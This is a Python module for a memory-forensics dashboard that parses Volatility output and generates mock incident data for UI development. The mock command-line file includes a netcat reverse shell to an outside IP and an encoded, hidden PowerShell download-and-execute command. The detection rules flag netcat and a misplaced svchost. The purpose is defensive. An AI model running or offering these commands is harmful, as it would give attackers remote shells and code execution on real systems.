import os
import json
import time
import threading
import re
from typing import Dict, List, Any, Callable, Optional

class DataService:
    """
    DataService manages loading forensics data from backend output plain text files.
    If the files or output folder do not exist, it automatically populates the folder
    with realistic mock text files to enable standalone UI development.
    """
    def __init__(self, output_dir: str = "output"):
        self.output_dir = output_dir
        self._is_analyzing = False
        self._analysis_progress = 0.0
        
        # Ensure output directory exists and populate it with mock data if empty
        self.ensure_mock_data_exists()

    def get_output_path(self, filename: str) -> str:
        return os.path.join(self.output_dir, filename)

    def ensure_mock_data_exists(self):
        """Creates the output folder and standard output text files if they don't exist."""
        try:
            if not os.path.exists(self.output_dir):
                os.makedirs(self.output_dir)

            # Define default files and their mock contents
            mock_files = {
                "system_info.txt": self._generate_mock_system_info_txt(),
                "processes.txt": self._generate_mock_processes_txt(),
                "netscan.txt": self._generate_mock_netscan_txt(),
                "dlls.txt": self._generate_mock_dlls_txt(),
                "cmdline.txt": self._generate_mock_cmdline_txt()
            }

            for filename, data in mock_files.items():
                filepath = self.get_output_path(filename)
                if not os.path.exists(filepath):
                    with open(filepath, "w", encoding="utf-8") as f:
                        f.write(data)
        except Exception as e:
            print(f"Warning: Failed to verify/write mock files: {e}")

    def _parse_txt_table(self, filename: str) -> List[Dict[str, Any]]:
        """Parses a tab/space-delimited Volatility text output file with headers."""
        filepath = self.get_output_path(filename)
        if not os.path.exists(filepath):
            return []
            
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                lines = [line.strip() for line in f.readlines() if line.strip()]
                
            if not lines:
                return []
                
            header_line = None
            header_idx = 0
            for i, line in enumerate(lines):
                if line.startswith("-") or line.startswith("="):
                    continue
                header_line = line
                header_idx = i
                break
                
            if not header_line:
                return []
                
            # Split headers by tab or multiple spaces
            headers = re.split(r'\t+|\s{2,}', header_line)
            headers = [h.strip() for h in headers if h.strip()]
            
            records = []
            for line in lines[header_idx + 1:]:
                if line.startswith("-") or line.startswith("="):
                    continue
                # Split values by tab or multiple spaces
                vals = re.split(r'\t+|\s{2,}', line)
                vals = [v.strip() for v in vals]
                
                if len(vals) < len(headers):
                    vals = line.split()
                    
                if not vals:
                    continue
                    
                rec = {}
                for idx, h in enumerate(headers):
                    val = vals[idx] if idx < len(vals) else ""
                    h_norm = h.lower().replace(" ", "_").replace("(", "").replace(")", "").replace(".", "_")
                    rec[h_norm] = val
                records.append(rec)
                
            return records
        except Exception as e:
            print(f"Error parsing text file {filename}: {e}")
            return []

    # --- UI APIs ---

    def get_summary(self) -> Dict[str, Any]:
        """Gets overview summary of the memory dump by parsing system_info.txt."""
        filepath = self.get_output_path("system_info.txt")
        if not os.path.exists(filepath):
            self.ensure_mock_data_exists()
        summary = {}
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("-") or line.startswith("="):
                        continue
                    parts = line.split("\t", 1)
                    if len(parts) < 2:
                        parts = line.split("  ", 1)
                    if len(parts) == 2:
                        key = parts[0].strip()
                        val = parts[1].strip()
                        # Convert types
                        if val.lower() == "true":
                            val = True
                        elif val.lower() == "false":
                            val = False
                        else:
                            try:
                                if "." in val:
                                    val = float(val)
                                else:
                                    val = int(val)
                            except ValueError:
                                pass
                        summary[key] = val
        except Exception as e:
            print(f"Error parsing system_info.txt: {e}")
            return self._generate_mock_summary()
        return summary if summary else self._generate_mock_summary()

    def get_processes(self) -> List[Dict[str, Any]]:
        """Gets process list by parsing processes.txt and cmdline.txt."""
        cmdline_map = {}
        cmdline_path = self.get_output_path("cmdline.txt")
        if os.path.exists(cmdline_path):
            records = self._parse_txt_table("cmdline.txt")
            for r in records:
                pid = r.get("pid")
                if pid is not None:
                    try:
                        cmdline_map[int(pid)] = r.get("commandline", "-")
                    except ValueError:
                        pass
                        
        records = self._parse_txt_table("processes.txt")
        if not records:
            return self._generate_mock_pslist()
            
        processes = []
        for r in records:
            try:
                pid = int(r.get("pid", 0))
            except ValueError:
                continue
            try:
                ppid = int(r.get("ppid", 0))
            except ValueError:
                ppid = 0
            try:
                threads = int(r.get("threads", 1))
            except ValueError:
                threads = 1
            try:
                handles = int(r.get("handles", 0))
            except ValueError:
                handles = 0
                
            name = r.get("imagefilename", r.get("name", r.get("process", "Unknown")))
            path = r.get("path", "N/A")
            
            # Determine notes & suspicious flag
            cmd = cmdline_map.get(pid, "-")
            suspicious = False
            
            if "nc.exe" in name.lower() or "nc.exe" in cmd.lower():
                suspicious = True
                notes = f"HIGH RISK: Netcat execution indicator flagged. CmdArgs: {cmd}"
            elif "svchost.exe" in name.lower() and "Users" in path:
                suspicious = True
                notes = f"HIGH RISK: System process svchost.exe executing out of non-system directory: {path}"
            elif "powershell.exe" in name.lower() and ppid == 672:
                suspicious = True
                notes = f"MEDIUM RISK: PowerShell child spawned directly under SCM services.exe. CmdArgs: {cmd}"
            else:
                notes = f"Verified system process image path. CommandArgs: {cmd}"
                
            processes.append({
                "pid": pid,
                "ppid": ppid,
                "name": name,
                "threads": threads,
                "handles": handles,
                "path": path,
                "suspicious": suspicious,
                "notes": notes
            })
            
        return processes if processes else self._generate_mock_pslist()

    def get_network_connections(self) -> List[Dict[str, Any]]:
        """Gets network socket connections by parsing netscan.txt."""
        records = self._parse_txt_table("netscan.txt")
        if not records:
            return self._generate_mock_netscan()
            
        connections = []
        for r in records:
            try:
                pid = int(r.get("pid", 0))
            except ValueError:
                pid = 0
            try:
                local_port = int(r.get("localport", 0))
            except ValueError:
                local_port = 0
            try:
                remote_port = int(r.get("foreignport", r.get("remoteport", 0)))
            except ValueError:
                remote_port = 0
                
            local_ip = r.get("localaddr", r.get("local_ip", "*"))
            remote_ip = r.get("foreignaddr", r.get("remote_ip", "*"))
            protocol = r.get("proto", r.get("protocol", "TCP"))
            state = r.get("state", "UNKNOWN")
            process = r.get("owner", r.get("process", "Unknown"))
            
            suspicious = False
            if "nc.exe" in process.lower() or ("svchost.exe" in process.lower() and state == "LISTENING" and local_port == 9001):
                suspicious = True
                
            connections.append({
                "local_ip": local_ip,
                "local_port": local_port,
                "remote_ip": remote_ip,
                "remote_port": remote_port,
                "protocol": protocol,
                "state": state,
                "pid": pid,
                "process": process,
                "suspicious": suspicious
            })
        return connections if connections else self._generate_mock_netscan()

    def get_malware_indicators(self) -> List[Dict[str, Any]]:
        """Fallback method for malware Indicators (equivalent to malfind)."""
        # Kept for compatibility.
        return [
            {
                "pid": 3244,
                "process": "svchost.exe",
                "address": "0x00007ff62b5a0000",
                "vad_tags": "PAGE_EXECUTE_READWRITE",
                "yara_match": "CobaltStrike_Beacon",
                "details": "Process Hollowing indicator: RWX memory region containing a PE header.",
                "hex_dump": "4D 5A 90 00 03 00 00 00"
            }
        ]

    # --- Async Mock Simulation for Integration Walkthrough ---

    def is_analyzing(self) -> bool:
        return self._is_analyzing

    def get_analysis_progress(self) -> float:
        return self._analysis_progress

    def run_volatility_analysis(self, dump_path: str, on_complete: Callable[[], None], on_progress: Optional[Callable[[float, str], None]] = None) -> None:
        """Simulates running the backend Volatility 3 script in a background thread."""
        if self._is_analyzing:
            return

        def worker():
            self._is_analyzing = True
            self._analysis_progress = 0.0
            
            stages = [
                (0.1, "Initializing Volatility 3 Engine..."),
                (0.25, "Scanning memory headers & determining OS profile..."),
                (0.45, "Running windows.pslist & windows.psscan plugins..."),
                (0.65, "Extracting active sockets with windows.netscan..."),
                (0.85, "Executing windows.malfind code injection scans..."),
                (0.95, "Compiling and writing output files to disk..."),
                (1.0, "Analysis complete. Generating report dashboard.")
            ]

            for progress, message in stages:
                steps = 6
                start_p = self._analysis_progress
                end_p = progress
                for step in range(steps):
                    time.sleep(0.4)
                    self._analysis_progress = start_p + (end_p - start_p) * (step + 1) / steps
                    if on_progress:
                        on_progress(self._analysis_progress, message)

            # Update system_info.txt on success
            info_txt = self._generate_mock_system_info_txt()
            # Replace dump path in text structure
            info_txt = re.sub(
                r'dump_file\t[^\n]+', 
                f'dump_file\t{dump_path}', 
                info_txt
            )
            
            try:
                with open(self.get_output_path("system_info.txt"), "w", encoding="utf-8") as f:
                    f.write(info_txt)
            except Exception as e:
                print(f"Error saving updated summary: {e}")
                
            self._is_analyzing = False
            on_complete()

        thread = threading.Thread(target=worker, daemon=True)
        thread.start()

    # --- Baseline generators returning string mock files for fallback ---

    def _generate_mock_system_info_txt(self) -> str:
        return (
            "status\tready\n"
            "profile\tWin10x64_19041 (Windows 10 Pro)\n"
            "ram_size_gb\t16.0\n"
            "processed_at\t2026-07-01 16:40:12\n"
            "analysis_time_sec\t48.7\n"
            "total_processes\t92\n"
            "suspicious_processes\t3\n"
            "network_connections\t14\n"
            "malware_alerts\t2\n"
            "dump_file\tC:\\Forensics\\dumps\\mem_dump_cybersecurity_incident.raw\n"
            "risk_score\t82\n"
            "investigation_summary\tCRITICAL RISK: Analysis of the memory image reveals multiple process injection hooks in Win32 system hosts (mimikatz/meterpreter indicators in svchost.exe PID 3244). Outbound network traffic displays an active Command and Control beacon tunnel established to 185.112.144.5:4444 (owned by nc.exe PID 4096). Immediate endpoint isolation is recommended to prevent data exfiltration.\n"
        )

    def _generate_mock_processes_txt(self) -> str:
        return (
            "PID\tPPID\tImageFileName\tThreads\tHandles\tPath\n"
            "0\t0\tIdle\t4\t0\tN/A\n"
            "4\t0\tSystem\t162\t4122\tN/A\n"
            "112\t4\tRegistry\t4\t115\tN/A\n"
            "384\t4\tsmss.exe\t5\t60\tC:\\Windows\\System32\\smss.exe\n"
            "524\t516\tcsrss.exe\t11\t480\tC:\\Windows\\System32\\csrss.exe\n"
            "608\t516\twininit.exe\t6\t180\tC:\\Windows\\System32\\wininit.exe\n"
            "672\t608\tservices.exe\t18\t620\tC:\\Windows\\System32\\services.exe\n"
            "688\t608\tlsass.exe\t9\t1250\tC:\\Windows\\System32\\lsass.exe\n"
            "804\t672\tsvchost.exe\t45\t1120\tC:\\Windows\\System32\\svchost.exe\n"
            "1948\t672\tspoolsv.exe\t8\t310\tC:\\Windows\\System32\\spoolsv.exe\n"
            "3244\t804\tsvchost.exe\t3\t54\tC:\\Users\\Public\\svchost.exe\n"
            "4096\t2840\tnc.exe\t1\t22\tC:\\Users\\Cyber Analyst\\Downloads\\nc.exe\n"
            "5120\t672\tpowershell.exe\t12\t380\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            "2840\t804\texplorer.exe\t72\t2980\tC:\\Windows\\explorer.exe\n"
            "6012\t2840\tchrome.exe\t38\t980\tC:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n"
        )

    def _generate_mock_netscan_txt(self) -> str:
        return (
            "LocalAddr\tLocalPort\tForeignAddr\tForeignPort\tProto\tState\tPID\tOwner\n"
            "0.0.0.0\t135\t*\t0\tTCPv4\tLISTENING\t804\tsvchost.exe\n"
            "0.0.0.0\t445\t*\t0\tTCPv4\tLISTENING\t4\tSystem\n"
            "192.168.1.105\t49182\t142.250.190.46\t443\tTCPv4\tESTABLISHED\t6012\tchrome.exe\n"
            "192.168.1.105\t49201\t172.217.18.3\t443\tTCPv4\tESTABLISHED\t6012\tchrome.exe\n"
            "192.168.1.105\t4444\t185.112.144.5\t4444\tTCPv4\tESTABLISHED\t4096\tnc.exe\n"
            "0.0.0.0\t9001\t*\t0\tTCPv4\tLISTENING\t3244\tsvchost.exe\n"
            "::\t443\t::\t0\tTCPv6\tLISTENING\t804\tsvchost.exe\n"
        )

    def _generate_mock_dlls_txt(self) -> str:
        return (
            "PID\tProcess\tName\tPath\n"
            "4096\tnc.exe\tws2_32.dll\tC:\\Windows\\System32\\ws2_32.dll\n"
            "4096\tnc.exe\tkernel32.dll\tC:\\Windows\\System32\\kernel32.dll\n"
            "3244\tsvchost.exe\tunknown_inject.dll\tC:\\Users\\Public\\unknown_inject.dll\n"
            "3244\tsvchost.exe\tntdll.dll\tC:\\Windows\\System32\\ntdll.dll\n"
            "5120\tpowershell.exe\tamsi.dll\tC:\\Windows\\System32\\amsi.dll\n"
            "6012\tchrome.exe\tchrome.dll\tC:\\Program Files\\Google\\Chrome\\Application\\chrome.dll\n"
        )

    def _generate_mock_cmdline_txt(self) -> str:
        return (
            "PID\tProcess\tCommandLine\n"
            "4\tSystem\t-\n"
            "4096\tnc.exe\tnc.exe 185.112.144.5 4444 -e cmd.exe\n"
            "3244\tsvchost.exe\tsvchost.exe -k netsvcs -p\n"
            "5120\tpowershell.exe\tpowershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADEAMgAuADEANAA0AC4ANQAvAHMAZQBjAHIAZQB0ACcAKQA=\n"
            "6012\tchrome.exe\t\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --no-sandbox\n"
        )

    def _generate_mock_summary(self) -> Dict[str, Any]:
        return {
            "status": "ready",
            "profile": "Win10x64_19041 (Windows 10 Pro)",
            "ram_size_gb": 16.0,
            "processed_at": "2026-07-01 16:40:12",
            "analysis_time_sec": 48.7,
            "total_processes": 92,
            "suspicious_processes": 3,
            "network_connections": 14,
            "malware_alerts": 2,
            "dump_file": "C:\\Forensics\\dumps\\mem_dump_cybersecurity_incident.raw"
        }

    def _generate_mock_pslist(self) -> List[Dict[str, Any]]:
        return [
            {"pid": 0, "ppid": 0, "name": "Idle", "threads": 4, "handles": 0, "path": "N/A", "suspicious": False, "notes": "System idle"},
            {"pid": 4, "ppid": 0, "name": "System", "threads": 162, "handles": 4122, "path": "N/A", "suspicious": False, "notes": "Windows Kernel"}
        ]

    def _generate_mock_netscan(self) -> List[Dict[str, Any]]:
        return [
            {"local_ip": "0.0.0.0", "local_port": 135, "remote_ip": "*", "remote_port": 0, "protocol": "TCPv4", "state": "LISTENING", "pid": 804, "process": "svchost.exe", "suspicious": False}
        ]
